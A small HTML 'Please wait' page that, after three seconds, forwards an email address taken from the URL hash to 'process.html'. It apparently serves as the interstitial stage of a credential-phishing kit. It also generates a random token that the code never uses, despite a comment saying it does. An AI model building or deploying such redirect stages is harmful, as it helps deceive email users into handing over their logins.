<!DOCTYPE html>
<html>
<head>
  <title>Please wait...</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      background-color: #f4f4f4;
    }
    #message {
      font-size: 1.5em;
      margin-bottom: 20px;
    }
    #dots span {
      display: inline-block;
      animation: blink 1s infinite;
      margin: 0 2px;
    }
    #dots span:nth-child(2) { animation-delay: 0.2s; }
    #dots span:nth-child(3) { animation-delay: 0.4s; }

    @keyframes blink {
      0%, 50%, 100% { opacity: 0; }
      25%, 75% { opacity: 1; }
    }
  </style>
  <script>
    // Generate a random jargon string
    function generateJargon(length = 12) {
      const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      let result = "";
      for (let i = 0; i < length; i++) {
        result += charset.charAt(Math.floor(Math.random() * charset.length));
      }
      return result;
    }

    function redirect() {
      // Get email from current URL hash (without encoding @)
      const email = window.location.hash.substring(1); // removes the '#' at start

      // Generate random jargon token
      const jargon = generateJargon();

      // Construct redirect URL: email + jargon in hash
      const redirectURL = `process.html#${email}`;

      // Redirect
      window.location.href = redirectURL;
    }

    // Wait 3 seconds before redirect
    window.addEventListener("DOMContentLoaded", () => {
      setTimeout(redirect, 3000);
    });
  </script>
</head>
<body>
  <div id="message">Please wait<span id="dots"><span>.</span><span>.</span><span>.</span></span></div>
</body>
</html>
